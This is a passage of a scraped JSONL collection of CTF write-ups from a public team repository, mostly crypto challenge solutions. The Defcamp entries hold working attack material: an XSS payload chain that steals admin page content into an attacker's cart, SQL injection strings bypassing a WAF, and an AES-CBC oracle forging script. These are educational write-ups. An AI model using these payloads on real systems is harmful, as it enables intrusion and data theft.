$al\")\n    for i in range(2):\n        gdb.execute(\"n\")\ngdb.execute(\"c\")\nflag = sorted(flag, key=lambda x: x[0])\nprint(\"\".join([c[1] for c in flag]))\n```\n\nWhich gives us the flag: `EKO{1s_th1s_ju5t_4_w4rm_up?}`\n", "timestamp": "2025-10-21T13:31:56.439722"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-10-06-klctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-10-06-klctf/README.md", "content": "# KasperskyLab Industrial CTF Quals 2017\n\nTeam: c7f.m0d3, akrasuski1, nazywam, shalom, rev\n\n### Table of contents\n\n* [Bad computations (crypto)](bad_computations)\n* [Security home cameras (crypto)](cameras)\n* [Decrypt the message (crypto)](decrypt_message)\n* [Smart heater 1 (re/web)](heater_1)", "timestamp": "2025-10-21T13:31:56.985178"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-10-06-klctf/bad_computations/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-10-06-klctf/bad_computations/README.md", "content": "# Bad Computations (Crypto, 800p)\n\nIn the task we get [crypto code](crypt.py) and encrypted flag: `hnd/goJ/e4h1foWDhYOFiIZ+f3l1e4R5iI+Gin+FhA==`\n\nWe proceed with labelling the poorly obfuscated functions.\nIt's quite clear we have there something like: `primes_in_range`, `prime_sieve`, `extended_gcd` and `mod_inv`.\nNext we proceed to label the flag encryption procedure and it's easy to notice that it's Paillier Cryptosystem.\nSo once we label the code we end up with:\n\n```python\nflag_bytes = [ord(x) for x in flag]\npaillier_encrypted_constant = paillier_encrypt(b, g, n, r)\n\nfor i in range(len(flag_bytes)):\n\tflag_bytes[i] = (paillier_encrypt(flag_bytes[i], g, n, r) * paillier_encrypted_constant) % (n * n)\n\tflag_bytes[i] = paillier_decrypt(flag_bytes[i], [p, q], g)\n\nflag_bytes = b64encode(bytearray(flag_bytes))\nprint(str(flag_bytes)[2:-1])\n```\n\nSo in reality encrypted flag byte is multiplied by encrypted constant and later decrypted.\nBut Paillier has homomorphic properties.\nWe can calculate `encrypt(plaintext1 * plaintext2)` by doing `encrypt(plaintex1)^plaintext2 mod n^2` and we can calculate `encrypt(plaintext1 + plaintext2)` by doing `encrypt(plaintex1) * encrypt(plaintex2)`.\nHere we have the second option, so in reality the encryption code is just doing:\n\n`decrypt(encrypt(flag[i]) * encrypt(22)) = decrypt(encrypt(flag[i]+22)) = flag[i] + 22`\n\nSo we can simply run:\n```python\nprint(\"\".join([chr(ord(c) - 22) for c in 'hnd/goJ/e4h1foWDhYOFiIZ+f3l1e4R5iI+Gin+FhA=='.decode(\"base64\")]))\n```\n\nto get the flag: `paillier_homomorphic_encryption`\n\nI fail to see how this is worth 800p.\n", "timestamp": "2025-10-21T13:31:57.252052"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-10-06-klctf/cameras/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-10-06-klctf/cameras/README.md", "content": "# Cameras (Crypto, 300p)\n\nIn the task we get [encrypted png](sec.png).\nOur first guess is that it's going to be classic repeating key xor, so we try to solve it as such.\nWe know the constant 16 bytes of PNG header, so we can xor the first 16 bytes of the encrypted file to recover first 16 bytes of the xor key, and then xor the whole file with this key repeated.\nWe might be missing some bytes in the key by we can try padding it with 0 until we get some reasonable results for some padding length.\nWe can always look for some constant parts we should find -> IDAT, IHDR, IEND.\n\n```python\nimport codecs\n\nfrom crypto_commons.generic import xor\n\n\ndef main():\n    with codecs.open(\"sec.png\", \"rb\") as input_file:\n        data = [ord(c) for c in input_file.read()]\n        header = [137, 80, 78, 71, 13, 10, 26, 10]\n        key = xor(data, header)\n        print(key)\n        with codecs.open(\"out.png\", \"wb\") as output_file:\n            output_file.write(\"\".join([chr(c) for c in xor(data, key*10000)]))\n\n\nmain()\n```\n\nIt turns that the recovered key is `[255, 255, 255, 255, 255, 255, 255, 255]` so it's even simpler then we expected.\nWhole file is actually xored with the same value `0xFF`, or basically bits are negated.\nWe get: ![](out.png)\n", "timestamp": "2025-10-21T13:31:57.482394"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-10-06-klctf/decrypt_message/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-10-06-klctf/decrypt_message/README.md", "content": "# Decrypt message (Crypto, 700p)\n\nIn the task we get access to a webpage where we can put username and it stores some encrypted string in our cookie.\nThe value from cookie must store our username since it's later displayed on the webpage.\n\nWe start off by trying to play around with the encryption oracle and with the ciphertext we have.\nWe can notice quickly that:\n\n- It's a 16 byte block crypto - we can see alignment by 16 bytes\n- It is using some block chaining method, because many blocks of identical input  are encrypted differently\n\nFortunately errors are printed to the screen so we can get some information about the code running there by changing the ciphertext we have.\n\n- It's actually AES CBC with random IV stored as first block of the ciphertext\n- Data are stored as JSON and there is some more data behind our input\n- Data are being decoded into ascii before printing out on the screen, so if the data decrypt into some non-ascii values then we get encoding error\n\nFirst we recover the whole data, using the encoding error messages.\nWe can change k-th byte of the IV until the decryption fails with encoding error and it will tell us how the k-th data byte in first block was finally decrypted.\nSince we know how we changed the IV we can recover the initial plaintext value on the server.\nThis was we know that the plaitext is `{\"name\": \"our_input\",\"show_flag\": false}`.\n\nIt's clear now that we need to set the parameter `show_flag` to `true` to get the flag.\n\nIt's AES CBC so we can easily influence decryption of a single block by changing the IV, but here we need to work with 2 blocks, because the code checks for `name` parameter before it checks the `show_flag` parameter.\nSo we need to have both and this means 2 blocks.\n\nThis is tricky, because to force decryption of second block we need to change the first block, and this will make this first block to decrypt into some garbage values.\nHowever, we can use the IV to \"fix\" the first block decryption afterwards.\nWe can again use the fact that server tells us when it can't decode a certain value, so we know how certain byte was decrypted on the server, and we can change the IV byte accordingly.\n\nSince we know exactly the plaintext and ciphertext, and we know what plaintext we want to get, we can right away use xor to get the first block ciphertext we need.\nRest is just using the IV to force this first block to decrypt to expected value.\n\n```python\nimport base64\n\nimport requests\nfrom crypto_commons.generic import xor_string\n\n\ndef get_ciphertext(plaintext):\n    url = \"http://95.85.51.183/?name=\" + plaintext\n    result = requests.get(url)\n    return result.cookies['user_info'].decode(\"base64\").encode(\"hex\")\n\n\ndef get_plaintext(ciphertext):\n    url = \"http://95.85.51.183/\"\n    payload = base64.b64encode(ciphertext.decode(\"hex\"))\n    result = requests.get(url, cookies={'user_info': payload})\n    return result.content\n\n\ndef main():\n    forged_ct = get_ciphertext(\"a\" * 22).decode(\"hex\")\n    ct_block_1 = forged_ct[16:32]\n    ct_block_2 = forged_ct[32:48]\n    orig = \"\"\"{\"name\": \"aaaaaaaaaaaaaaaaaaaaaa\"\"\"\n    want = \"\"\"{\"name\": \"aaaaa\",\"show_flag\":1}\\1\"\"\"\n    pt_block_2 = orig[16:32]\n    expected_pt_block_1 = want[:16]\n    expected_pt_block_2 = want[16:32]\n    c1 = xor_string(xor_string(pt_block_2, expected_pt_block_2), ct_block_1)\n    new_iv = \"\"\n    for index in range(16):\n        for i in range(256):\n            print('testing value %d at index %d' % (i, index))\n            forged_ct = new_iv + chr(i)\n            forged_ct += (16 - len(forged_ct)) * \"a\"\n            forged_ct += c1 + ct_block_2\n            pt = get_plaintext(forged_ct.encode(\"hex\"))\n            if \"t decode byte\" in pt:\n                decrypted_byte = pt.split(\"t decode byte\")[1].split()[0].strip()\n                position = pt.split(\"position\")[1].split(\":\")[0]\n                if int(position.strip()) != index:\n                    continue\n                print index, new_iv.encode(\"hex\"), pt\n                decrypted_byte = int(decrypted_byte, 16)\n                real = decrypted_byte ^ ord(expected_pt_block_1[index]) ^ i\n                new_iv += chr(real)\n                break\n    print get_plaintext((new_iv + c1 + ct_block_2).encode(\"hex\"))\n\n\nmain()\n```\n\nAnd we get: `Flag: KLCTFFDA616A6DAF4E63A9F7B55B43124E548`\n", "timestamp": "2025-10-21T13:31:57.735235"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-04-hitcon/data_mining/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-04-hitcon/data_mining/README.md", "content": "# Data and Mining (Forensics, 137p)\n\nIn the task we get a rather large pcapng file (230 MB!), but the task was actually rather trivial because the flag was written in plaintext.\nSince we didn't expect it to be so, we first did load the file into Network Miner and Wireshark to see what exactly we have there.\n\nMost of is was some strange and random packets but looking around available TCP streams we finally find:\n\n```\n{\"method\":\"login\",\"params\":{\"login\":\"45duiDz79Y2AtSZH2pw9uV8YXmvtAT8tVNAYrfKTUnYiQZT5BMdRrGD4hbipmZ5DoaQXLak9ENEwYNC7kVk3ivDyMHyZCVV\",\"pass\":\"hitcon{BTC_is_so_expensive_$$$$$$$}\",\"agent\":\"xmr-stak-cpu/1.3.0-1.5.0\"},\"id\":1}\n{\"id\":1,\"jsonrpc\":\"2.0\",\"error\":null,\"result\":{\"id\":\"862725926260463\",\"job\":{\"blob\":\"0606f0caedcf05fdd86cbe0f15bc3348d604fe35830c579edf14293facd6ea0ccfe3eee4333da700000000fcbc11627100084072bdf490f984a780283662579715458b5b7cc79241b9916813\",\"job_id\":\"505683845491148\",\"target\":\"711b0d00\"},\"status\":\"OK\"}}\n{\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":{\"blob\":\"0606f0caedcf05fdd86cbe0f15bc3348d604fe35830c579edf14293facd6ea0ccfe3eee4333da700000000cfe1acb5536f58c031d3d283f6b28c6a5ec623199fc3c1a0566452af58c4ccfb13\",\"job_id\":\"246228154539130\",\"target\":\"4a861b00\"}}\n{\"method\":\"submit\",\"params\":{\"id\":\"862725926260463\",\"job_id\":\"246228154539130\",\"nonce\":\"88030000\",\"result\":\"193736d498976952b64024ec0a331fbb4cb25b70b3f049ebfdb1b8a49d670f00\"},\"id\":1}\n{\"id\":1,\"jsonrpc\":\"2.0\",\"error\":null,\"result\":{\"status\":\"OK\"}}\n{\"method\":\"submit\",\"params\":{\"id\":\"862725926260463\",\"job_id\":\"246228154539130\",\"nonce\":\"c6050000\",\"result\":\"2d88e73d77d30a2433bc278c0e95ccd201072fd8228bdf1549128d4eddde0a00\"},\"id\":1}\n{\"id\":1,\"jsonrpc\":\"2.0\",\"error\":null,\"result\":{\"status\":\"OK\"}}\n{\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":{\"blob\":\"0606f0caedcf05fdd86cbe0f15bc3348d604fe35830c579edf14293facd6ea0ccfe3eee4333da70000000080b6cf10161e3dbeae53526958001e18e799232b1c5497829f922e772d2a76f713\",\"job_id\":\"543452732195146\",\"target\":\"e3380e00\"}}\n{\"method\":\"submit\",\"params\":{\"id\":\"862725926260463\",\"job_id\":\"543452732195146\",\"nonce\":\"17010000\",\"result\":\"edc5c13d93b28620561c5a8f969fc0df30f8f4b6dafd11e749fe531aa6300200\"},\"id\":1}\n{\"id\":1,\"jsonrpc\":\"2.0\",\"error\":null,\"result\":{\"status\":\"OK\"}}\n{\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":{\"blob\":\"0606f0caedcf05fdd86cbe0f15bc3348d604fe35830c579edf14293facd6ea0ccfe3eee4333da700000000feb1a807a7690bfc5207eb5ab80741d918aadab53d2293237ce25f61c994dbc213\",\"job_id\":\"148255726112984\",\"target\":\"ce950700\"}}\n{\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":{\"blob\":\"0606a1ccedcf05ffcd054c320a4110c7468c4829f34dd84159522c9ba5e29cb9b1db57d855dde300000000b9978dcdfc7e40c8a7fa8305bb120b5c02e7eca365b2604fc70bc099f119112504\",\"job_id\":\"753287914698012\",\"target\":\"ce950700\"}}\n```\n\nWhich contains the flag in plaintext.\nIt turns out we could have just done `cat inputfile.pcapng | grep hitcon`.\n\n`hitcon{BTC_is_so_expensive_$$$$$$$}`\n", "timestamp": "2025-10-21T13:31:58.519233"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/README.md", "content": "# Defcamp CTF Finals 2017\n\nTeam: c7f.m0d3, psrok1, rev, shalom, lacky\n\n### Table of contents\n\n* [State agency (web)](state_agency)\n* [Caesar favourite song (misc/crypto)](favourite_song)\n* [Audio captcha (misc)](audio_captcha)\n* [Adversarial (misc)](adversarial)\n* [Hack tac toe (web/crypto)](hack_tac_toe)\n* [Fedora shop (web)](fedora_shop)\n", "timestamp": "2025-10-21T13:31:59.137869"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/adversarial/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/adversarial/README.md", "content": "# Adversarial (Misc/PPC)\n\nIn the task we get the [source code](adversarial-public.py) of the scoring server.\nWhat it does it pretty straightforward:\n\n1. Generate a matrix 100x1000 with random values from (-1,1)\n2. Select a single row in this matrix\n\nOur goal is to provide a vector of 100 values from range (-1,1) for which the `1 - get_probability(x)` function calculated on the dot product between our vector and the selected matrix row will be < 0.001\n\nThe `get_probability` function is simply:\n\n```python\ndef get_probability(z):\n\treturn 1./(1+np.exp(-(z)))\n```\n\nIt's easy to see that in order to get a small final result we need `get_probability` to return a value close to 1.\nThis implies that we need `e^-z` to be as small as possible, and therefore we want `z` to be as large as possible.\n\nAs mentioned above `z` here is just a dot product between selected matrix row and vector we supply.\nDot product is simply a sum of multiplied corresponding vector coordinates, eg. `[1,2,3] * [4,5,6] = 1*4+2*5+3*6`\n\nIt's rather trivial to figure out that in order to get the highest possible result we simply need to multiply all negative values by -1 and all positive values by 1:\n\n```python\ndef solve(feats):\n    return [-1 if feats[i] < 0 else 1 for i in range(len(feats))]\n```\n\nWhole solver available [here](solver.py)\n", "timestamp": "2025-10-21T13:31:59.364762"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/audio_captcha/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/audio_captcha/README.md", "content": "# Audio captcha (Misc/PPC)\n\nThis was a funny challenge, since we've done 2-3 of those some years ago.\n\nWe get a link to a webpage where we are supposed to listen to a [voice captcha](captcha.wav) and solve it.\nWe need to solve a number of them without failure to get a flag.\nSounds are distorted and actually it's pretty hard to solve those even manually, and things like Google Speech API are useless here.\n\n\nHowever, we had a pretty good idea how to work with this.\nThe audio data we got was wav, which means basically a raw sound stream.\nThe upside of this is that we can simply cut this stream into pieces and play them or work with them separately.\n\nIt was also pretty clear to us, that the sounds, although distorted, are actually always \"the same\".\nIt looked like the captcha was basically glued from the same inputs every time, without any random distortions.\n\nThis means we could do a simple pattern matching on the bytes!\nThe approach was simple:\n\n1. Download some captchas and solve them by hand.\n2. Split the captcha into 10 pieces (there were always 10 symbols)\n3. Cut a bunch of bytes from the piece and place it in our patterns list, alongside the symbol we take it for\n\nNow that we have the list of patterns we can simply start solving the task:\n\n1. Download a captcha\n2. Cut into pieces\n3. For each piece go through the patterns list and try to get matchings\n4. If more than one pattern fits skip this captcha\n5. If only a single pattern matches the sample then add this symbol to the list\n6. If all symbols were found send the answer to the server.\n\nComplete solver can be found [here](captcha.py)\n", "timestamp": "2025-10-21T13:31:59.606963"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/favourite_song/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/favourite_song/README.md", "content": "# Caesar's favourite song (Misc/Crypto/Stegano)\n\nIn the task we get a [song](killthegauls.mp3).\nWe also know that the flag format is `DCTFXXXDCTF`.\n\nWe start off by translating the song into [notes](killthegauls.xml) by some free software.\nOne we have the transcription we parse this and store in a single list.\nInitially we didn't take octave into consideration and we couldn't get this to work, but fortunately at some point we remembered that there were sounds in a different octave. We marked this different octave sounds as lowercase, to keep track of them.\n\nWe noticed that if we combine pairs of sounds next to one another we get identical sequence of length 4 at the start and end, which would fit the flag format:\n\n`['AA', 'AG', 'BA', 'Ac', 'GD', 'GD', 'GD', 'AB', 'AF', 'Ge', 'Gc', 'AB', 'GD', 'GD', 'GA', 'GB', 'GB', 'AA', 'AE', 'GD', 'AG', 'GF', 'GA', 'AB', 'GA', 'GG', 'AB', 'GG', 'Ge', 'Ac', 'AA', 'GE', 'AG', 'GE', 'AA', 'GD', 'Gf', 'Gd', 'Ge', 'Gd', 'AA', 'AG', 'BA', 'Ac']`\n\nNow we need to somehow \"decrypt\" rest of the flag.\nWe knew that `AA` should become `D`, `AG` should be `C`, `BA` should be `T` and `Ac` should be `F`.\n\nLooking at bits of the expected symbol we noticed that bit sequences of the `A` are the same, but in case of `BA` they're shifted by 4.\nWe guessed that there is a simple arithmetic encoding here -> first character in the pair is translated into some number and shifter by 4 bits to the left, and then added to the translated second character.\nFrom the flag format we could devise that `A` has to translate to `4`, `G` translate to `3`, `B` translate to `5` and `c` translate to `6`.\n\nWe expected that those are not just some random values, since otherwise we could not decrypt this in an unique way.\nSince this was all about music, we thought that maybe it's an actual music scale, we looked at some and finally we found one that fit -> `D major`.\nWe applied the whole scale and decrypted the flag.\n\nWhole solver [here](caesar.py)\n", "timestamp": "2025-10-21T13:31:59.873916"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/fedora_shop/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/fedora_shop/README.md", "content": "# Fedora shop (Web)\n\nWe get access to a online shop with fedoras (every hacker should wear one!):\n\n![](page.png)\n\nOnce we add some stuff to the cart, we can submit the order and there we can see that the order initially has status `Pending approval` and after a a short while it gets changed to `Shipped`.\nIt seems like a textbook example for a XSS attack, so we try some injections in the fields of the order, and it turns out the \"Telephone\" field is not sanitized properly and can be injected with javascript.\nThere are, however, some problems:\n\n1. There is a limit to how long the fields in the order can be, and the telephone field can't fit a long payload, so we have very limited number of characters we can use there.\n2. The task description says that the admin is behind a firewall, and it seems that he can't make any external connections. It means that even if we can execute XSS code as admin, we can't really get the results back.\n\n\nThe first problem can be tackled by splitting the payload among other fields in the form and using the vulnerable field just as entry point. So there we put only:\n\n```javascript\n<script>\n    window.onload=function(){\n        eval(document.getElementsByTagName('td')[15].innerText);\n    };\n</script>\n```\n\nwhere the 15th `<td>` tag contains the contents of the field `other information`.\nThere we put:\n\n```javascript\nxhr = new XMLHttpRequest();\nxhr.open('GET','/admin.php');\nxhr.onreadystatechange = function() {\n    if(xhr.readyState === XMLHttpRequest.DONE){\n        eval(document.getElementsByTagName('td')[14].innerText);\n    }\n};\nxhr.send();\n```\n\nThis will read the contents of the `admin.php` page for us and then it will invoke the script stored in 14th `<td>` which means contents of `address` field.\nBy using this approach we bypass the problem of running a long script.\n\nThe other issue is how to retrieve the data back from the server since admin can't connect to any external server.\n\nWe noticed that the cart is implemented server-side, so the information about the object we put there is stored on the server and retrieved by session ID cookie.\nThe admin might not be able to connect to any external server, but can access the fedora shop as localhost, so we could potentially force the admin to place some things in a cart with specified session ID.\n\nInitially we thought we will need to extract data character by character, by putting the ascii code of a single character as `quantity` of the fedoras to buy, but we noticed that there is no check if the field content is a number!\nThis meant we could simply put all of the contents at once with a single operation.\nSo the final part of the payload was:\n\n```javascript\nxhr = new XMLHttpRequest();\nxhr.open('POST','/?action=add&code=wfedora',true);\nxhr.withCredentials=true;\ndocument.cookie='PHPSESSID=\"\"\" + session + \"\"\"';\nxhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');\nxhr.send('quantity='+this.responseText);\n```\n\nOnce we run the attack we can see in our cart:\n\n![](cart.png)\n\nWhole attack script [here](fedora.py)\n", "timestamp": "2025-10-21T13:32:00.121318"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/hack_tac_toe/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/hack_tac_toe/README.md", "content": "# Hack-tac-toe (Web/Crypto)\n\nIn the task we have access to a webpage where two players can play tic-tac-toe.\nPart of the logic is client-side and part is server side.\nWe notice right away that there is a cookie `Encrypted_Game_Session` which changes while we play.\n\nBy analysing how the cookie changes we can see that for example changing a single letter of player name the cookie changes by a single byte.\nThis indicates some kind of stream cipher applied over the game state.\n\nHowever, since nothing else changes it indicates that the keystream stays the same, at least for the current user.\nThis means if we could retrieve the keystream, we could decrypt the game state and potentially change it however we want.\nIt is quite simple to recover the keystream following the player name, since keystream is simply XORed with plaintext, and we know the plaintext and we know the position of this plaintext (we can see where the ciphertext changed when we supplied a new player name).\n\nWe can:\n\n1. Get the original cookie\n2. Set name to 'a'*100\n3. Get the new cookie\n4. Notice that the difference starts at 112 byte\n5. Get bytes [112:(112+100)] from the second cookie and XOR them with 'a'*100 to recover the keystream\n6. XOR the keystream with original cookie from position 112\n\nThis gives us:\n\n`ayer 1\";s:5:\"name2\";s:8:\"Player 2\";s:5:\"score\";i:0;s:6:\"score2\";i:0;}`\n\nWhich is part of the decrypted cookie.\nHere we were a bit confused what to do next. \nIt seems we have here some PHP serialization, but no real way to exploit it.\n\nFortunately we looked at the recovered keystream:\n\n`400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed298764a8400ea7a5`\n\nAnd we noticed that it repeats itself!\nThe unique part is just 16 bytes: `400ea7a58971b0f78fa9c6ed298764a8`\n\nIt means we can simply decrypt the whole payload by XORing the cookie with repeated key:\n\n`a:5:{s:4:\"flag\";s:70:\"DCTF{5740379144eb29f04ff6536733eba47e4bdfa0f0faade836b7bc0d70fa1ab006}\";s:4:\"name\";s:8:\"Player 1\";s:5:\"name2\";s:8:\"Player 2\";s:5:\"score\";i:0;s:6:\"score2\";i:0;}`\n\nThe whole solver script [here](toe.py)\n", "timestamp": "2025-10-21T13:32:00.622835"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-11-09-defcamp-final/state_agency/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-11-09-defcamp-final/state_agency/README.md", "content": "# State agency (Web)\n\nWe get access to a webpage for reporting security vulnerabilities.\nIt seems basically nothing there works, apart from reading two existing reports.\nOnce we click on them we get a link with same GET parameters (which are ignored), but the interesting part is that the link is for example `http://5889.state-agency.tux.ro/` where `5589` is the ID of article we want to read.\nIf we change it to some random value we get information that our SQL is wrong.\n\nUpon further inspection we figure out that in reality we simply need to change `Host` header to manipulate this value.\nWe guessed that there will be some SQL injection via the ID, but it seemed a lot of stuff was blacklisted by internal WAF and not knowing the query layout made this hard.\nEventually we managed to get some working injections.\nInitally a blind one, based on 1 or 2 articles in the result, but eventually we noticed that `union select` is not blacklisted in WAF, so we could get a full echo of the query.\n\nWe could use the payload: `5880') union select 1,2,3,4,5 -- a` to get the union result.\nThe problem was that the injection point we had was already after the condition to select only the \"public\" vulnerabilities, and we could not change this condition any more.\nWe needed to make a new query using `union select`, but we don't know the table name.\nThe `information schema` was blacklisted in WAF, so were any other useful things.\nFinally we found out that `procedure analyse` is not in the blacklist!\n\nWe could then send `5880') procedure analyse() -- a` and get back information that we're interested in the table `agency.articles` and the column most likely `content`.\nBut when sending `5880') union select 1,2,3,4,content from articles -- a` we get back `Private data exfiltration attempt blocked` so it seems the WAF checks if flag is in the response.\nBut this is not a problem, we can do: `5880') union select 1,2,3,4,to_base64(content) from articles -- a` to encode the flag and bypass the WAF.\n\nWhole solver [here](sql.py)\n", "timestamp": "2025-10-21T13:32:00.854560"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/README.md", "content": "# SECCON 2017 Quals\n\nTeam: c7f.m0d3, cr019283, akrasuski1, nazywam, shalom, rev\n\n### Table of contents\n\n* [SqlSRF (web)](web_sqlsrf)\n* [Ps and Qs (crypto)](crypto_ps_and_qs)\n* [Vigenere 3d(crypto)](crypto_vigenere)\n* [Simon and Speck Block Ciphers (crypto)](crypto_simon)\n* [JPEG File (misc)](misc_jpeg)\n* [Very smooth (crypto)](crypto_smooth)\n* [Automatic door (web)](web_automatic)\n", "timestamp": "2025-10-21T13:32:01.400624"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/crypto_ps_and_qs/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/crypto_ps_and_qs/README.md", "content": "# Ps and Qs (Crypto, 200p)\n\nIn the task we get a [ciphertext](cipher) and two RSA public keys: [pub1](pub1.pub), [pub2](pub2.pub).\n\nAs usual in case when there are more than one RSA public key, it's worth to check if maybe they don't share a prime:\n\n```python\nimport codecs\nfrom Crypto.PublicKey import RSA\nfrom crypto_commons.rsa.rsa_commons import gcd\n\ndef read_key(filename):\n    with codecs.open(filename, \"r\") as input_file:\n        data = input_file.read()\n        pub = RSA.importKey(data)\n        print(pub.e, pub.n)\n    return pub\n\n\ndef main():\n    pub1 = read_key(\"pub1.pub\")\n    pub2 = read_key(\"pub2.pub\")\n    p = gcd(pub1.n, pub2.n)\n    print(p)\n```\n\nAnd yes, in this case they do share a prime, so we can easily factor both keys.\nNow we simply need to recover private keys for both keys by calculating `modinv(e, (p-1)*(q-1))` and trying to use them to decrypt the flag:\n\n```python\nimport codecs\nfrom Crypto.Util.number import long_to_bytes\nfrom crypto_commons.generic import bytes_to_long\nfrom crypto_commons.rsa.rsa_commons import gcd, get_fi_distinct_primes, modinv\n\ndef read_ct():\n    with codecs.open(\"cipher\", \"rb\") as input_file:\n        data = input_file.read()\n        print(len(data))\n        msg = bytes_to_long(data)\n    return msg\n\n\np = gcd(pub1.n, pub2.n)\nprint(p)\nq1 = pub1.n / p\nq2 = pub2.n / p\nprint(p, q1)\nprint(p, q2)\nmsg = read_ct()\n\nd1 = modinv(pub1.e, get_fi_distinct_primes([p, q1]))\nd2 = modinv(pub2.e, get_fi_distinct_primes([p, q2]))\n\nfirst = pow(msg, d1, pub1.n)\nprint(long_to_bytes(first))\n```\n\nAlready the first key gives us the flag: `SECCON{1234567890ABCDEF}`\n\nComplete solver [here](solver.py)\n", "timestamp": "2025-10-21T13:32:01.659519"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/crypto_simon/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/crypto_simon/README.md", "content": "# Simon and Speck Block Ciphers (Crypto, 100p)\n\n```\nSimon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 \n```\n\nIn the task we get the plaintext, ciphertext and the information what is the encryption.\nWe also get the key with 4 missing characters.\nIt seems like a good target to simply brute-force, because 4 bytes is not much.\n\nWe found the Simon algorithm at https://github.com/inmcm/Simon_Speck_Ciphers/blob/master/Python/simon.py and we prepared a simple brute-force script:\n\n```python\nfrom crypto_commons.brute.brute import brute\nfrom crypto_commons.generic import bytes_to_long\n\ndataset = string.uppercase + string.lowercase + string.digits + string.punctuation + \" \"\n\ndef worker(a):\n    print(a)\n    for b in dataset:\n        for c in dataset:\n            for d in dataset:\n                # Simon_96_64, ECB, key = \"SECCON{xxxx}\", plain = 0x6d564d37426e6e71, cipher = 0xbb5d12ba422834b5\n                key = \"SECCON{\" + a + b + c + d + \"}\"\n                w = SimonCipher(bytes_to_long(key), key_size=96, block_size=64)\n                t = w.encrypt(0x6d564d37426e6e71)\n                if t == 0xbb5d12ba422834b5:\n                    print(key)\n                    sys.exit(0)\n\n\nif __name__ == \"__main__\":\n    brute(worker, dataset, 7)\n```\n\nNothing special here, we simply try every 4 character combination as the key, until the ciphertext matches.\n\nIt was pretty slow so we used PyPy and multiprocessing to run in paralell on multiple cores.\nAfter a while we got: `SECCON{6Pz0}`\n", "timestamp": "2025-10-21T13:32:01.895977"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/crypto_smooth/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/crypto_smooth/README.md", "content": "# Very Smooth (Crypto, 300p)\n\nIn the task we get a [pcap](s.pcap) with RSA encrypted SSL traffic.\nThe task name suggests that maybe the RSA modulus or primes are a smooth number and modulus can be factored in some simple way.\n\nFirst we open the pcap in Network Miner in order to recover the [server certificate](SRL.cer).\nNext we use openssl to dump just the RSA key from the certificate `openssl x509 -inform der -pubkey -noout -in SRL.cer > public_key.pem` which gives us [public key](public_key.pem).\n\nNow we can proceed with factoring the key.\nIt turns out the Williams P+1 method works because one of the primes is of form `11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001` so `prime-1` is a smooth number.\n\nOnce we factored the modulus we can generate a fake server private key:\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom primefac import williams_pp1, modinv\n\n\ndef main():\n    pub = \"\"\"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy\n8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj\nDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl\nyioxCqbXYIMxGO4NcQIDAQAB\n-----END PUBLIC KEY-----\n\"\"\"\n    pub = RSA.importKey(pub)\n    print(pub.e, pub.n)\n    p = long(williams_pp1(pub.n))\n    q = pub.n / p\n    print(p,q)\n    assert pub.n == p * q\n    priv = RSA.construct((pub.n, pub.e, modinv(pub.e, (p - 1) * (q - 1))))\n    print(priv.exportKey('PEM'))\n\n\nmain()\n```\n\nWe then use this key in Wireshark (Edit -> Preferences -> Protocols -> SSL -> RSA Key List) and it decrypts the SSL traffic for us.\nWe can see the webpage:\n\n```html\n<html>\n<head><title>Very 